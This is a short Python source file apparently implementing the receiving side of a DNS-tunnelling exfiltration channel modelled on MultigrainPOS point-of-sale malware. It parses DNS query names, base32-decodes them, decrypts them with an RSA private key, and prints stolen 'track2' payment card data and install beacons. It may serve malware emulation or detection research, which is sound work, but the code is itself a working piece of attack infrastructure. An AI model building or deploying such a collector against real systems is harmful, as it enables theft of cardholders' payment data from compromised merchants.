from base64 import b32decode

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

from tdns.exfil import base


class multigrainpos(base):
    def __init__(self, private_key, **kwargs):
        super().__init__(**kwargs)
        self.private_key = private_key

    def decode(self, text):
        return b32decode(text)

    def decrypt(self, ciphertext: bytes):
        return self.private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def install(self, msg):
        print(f"received `install` from {msg[:8]} with data: {msg[8:]}")

    def log(self, msg):
        print(f"received track2 data: {self.decrypt(msg)}")

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.')
        req_type = text[0]
        corrected = ''.join(text[1:-3])  # label correction
        decoded = self.decode(corrected)
        if req_type == 'install':
            self.install(decoded)
        elif req_type == 'log':
            self.log(decoded)
